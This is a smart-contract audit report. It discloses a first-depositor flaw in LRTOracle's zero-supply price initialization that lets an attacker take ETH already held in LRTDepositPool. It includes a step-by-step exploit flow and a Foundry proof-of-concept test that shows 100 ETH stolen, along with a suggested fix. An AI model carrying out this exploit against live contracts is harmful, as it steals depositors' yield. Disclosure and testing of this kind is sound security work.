Audit Report

## Title
Zero-Supply Price Initialization Ignores Pre-Existing Protocol ETH, Enabling First-Depositor Yield Theft — (`contracts/LRTOracle.sol`)

## Summary

`LRTOracle._updateRsETHPrice()` unconditionally pins `rsETHPrice = 1 ether` whenever `rsethSupply == 0`, regardless of ETH already held in `LRTDepositPool`. Because `LRTDepositPool` exposes multiple payable entry points with no access control, ETH can accumulate before the first rsETH mint. The first depositor receives rsETH at the stale 1 ether rate; once the price is updated to reflect the real backing, their rsETH is worth more than they deposited, allowing them to drain the pre-existing yield/rewards.

## Finding Description

**Root cause — `LRTOracle._updateRsETHPrice()` lines 218–222:**

```solidity
if (rsethSupply == 0) {
    rsETHPrice = 1 ether;
    highestRsethPrice = 1 ether;
    return;
}
``` [1](#0-0) 

This early return fires whenever `rsethSupply == 0` and never calls `_getTotalEthInProtocol()`, so any ETH already sitting in the pool is invisible to the price calculation.

**ETH accumulation paths — `LRTDepositPool.sol` lines 58–67:**

All four receive functions are `external payable` with zero access control:

```solidity
receive() external payable { }
function receiveFromRewardReceiver() external payable { }
function receiveFromLRTConverter() external payable { }
function receiveFromNodeDelegator() external payable { }
``` [2](#0-1) 

Any of these can be called (or ETH sent directly) before the first deposit.

**Price used for minting — `LRTDepositPool.getRsETHAmountToMint()` line 520:**

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [3](#0-2) 

The stale `rsETHPrice = 1 ether` is used directly, so the first depositor receives rsETH as if no pre-existing ETH exists.

**Pre-existing ETH is counted post-deposit — `LRTDepositPool.getETHDistributionData()` line 480:**

```solidity
ethLyingInDepositPool = address(this).balance;
``` [4](#0-3) 

After the first deposit, `_getTotalEthInProtocol()` now counts both the depositor's ETH and the pre-existing ETH, so the next `updateRSETHPrice()` call sets a price that reflects the full pool balance divided by the small rsETH supply.

**`pricePercentageLimit` guard is insufficient:** The check at lines 252–266 only blocks a non-manager caller if `pricePercentageLimit > 0`. Its default value is `0` (never set in `initialize()`), so the guard is inactive at protocol launch. Even if set, the manager's routine call to `updateRSETHPrice()` (or `updateRSETHPriceAsManager()`) achieves the same price update. [5](#0-4) 

**Exploit flow:**
1. ETH accumulates in `LRTDepositPool` (e.g., via `receiveFromRewardReceiver()`) before any rsETH is minted.
2. `updateRSETHPrice()` is called (public) → `rsETHPrice = 1 ether` (supply = 0).
3. Attacker calls `depositETH{value: 1 ether}(0, "")` → mints 1 rsETH at 1 ether price.
4. `updateRSETHPrice()` is called again (by attacker if `pricePercentageLimit == 0`, or by manager during normal operations) → `rsETHPrice = (1 + N) ether / 1 rsETH`.
5. Attacker calls `initiateWithdrawal(ETH, 1 rsETH, "")` → `expectedAssetAmount` is locked at `(1 + N) ETH`.
6. After `withdrawalDelayBlocks` (~8 days), attacker calls `completeWithdrawal(ETH, "")` → receives `(1 + N) ETH`, stealing the N ETH of pre-existing yield. [6](#0-5) 

## Impact Explanation

**High — Theft of unclaimed yield.**

ETH arriving via `receiveFromRewardReceiver()` or `receiveFromNodeDelegator()` before the first deposit represents protocol yield/rewards. The first depositor captures 100% of that yield by depositing at the artificially low 1 ether price and withdrawing after the price corrects. This maps directly to the allowed impact "High. Theft of unclaimed yield."

## Likelihood Explanation

**Low-Medium.** The window exists at protocol launch (before any user deposits) and after a full redemption cycle leaves residual rewards. No special privileges are required — the attacker only needs to be the first depositor. The `receiveFromRewardReceiver()` path is realistic at launch (e.g., EigenLayer rewards routed before the first user deposit). The 8-day withdrawal delay does not prevent the theft; it only delays it.

## Recommendation

When `rsethSupply == 0`, compute the actual ETH backing before defaulting to `1 ether`. If `_getTotalEthInProtocol()` returns a non-zero value, do not update the price and block deposits until an admin seeds the protocol with an initial deposit that accounts for the pre-existing assets:

```solidity
if (rsethSupply == 0) {
    uint256 totalETH = _getTotalEthInProtocol();
    if (totalETH == 0) {
        rsETHPrice = 1 ether;
        highestRsethPrice = 1 ether;
    }
    // If totalETH > 0, leave rsETHPrice unchanged and let deposits revert
    // until an admin action resolves the pre-existing balance.
    return;
}
```

Additionally, ensure `minAmountToDeposit` and deposit limits are configured before any ETH can arrive in the pool, and consider restricting `receiveFromRewardReceiver()` to the actual reward receiver address.

## Proof of Concept

**Minimal Foundry fork test outline:**

```solidity
function test_firstDepositorStealsPreExistingETH() public {
    // 1. Deploy protocol; rsethSupply == 0
    // 2. Call updateRSETHPrice() → rsETHPrice = 1 ether
    lrtOracle.updateRSETHPrice();
    assertEq(lrtOracle.rsETHPrice(), 1 ether);

    // 3. Send 100 ETH to LRTDepositPool via receiveFromRewardReceiver (no access control)
    vm.deal(address(this), 100 ether);
    lrtDepositPool.receiveFromRewardReceiver{value: 100 ether}();

    // 4. Attacker deposits 1 ETH → mints 1 rsETH at stale 1 ether price
    vm.deal(attacker, 1 ether);
    vm.prank(attacker);
    lrtDepositPool.depositETH{value: 1 ether}(0, "");
    assertEq(rsETH.balanceOf(attacker), 1 ether);

    // 5. Price update: totalETH = 101, supply = 1 → rsETHPrice = 101 ether
    lrtOracle.updateRSETHPrice();
    assertEq(lrtOracle.rsETHPrice(), 101 ether);

    // 6. Attacker initiates withdrawal of 1 rsETH → expects 101 ETH
    vm.prank(attacker);
    rsETH.approve(address(lrtWithdrawalManager), 1 ether);
    vm.prank(attacker);
    lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, 1 ether, "");

    // 7. Advance blocks past withdrawalDelayBlocks (~8 days)
    vm.roll(block.number + lrtWithdrawalManager.withdrawalDelayBlocks() + 1);

    // 8. Complete withdrawal → attacker receives 101 ETH
    uint256 balBefore = attacker.balance;
    vm.prank(attacker);
    lrtWithdrawalManager.completeWithdrawal(ETH_TOKEN, "");
    assertApproxEqAbs(attacker.balance - balBefore, 101 ether, 1e15); // stole 100 ETH
}
```
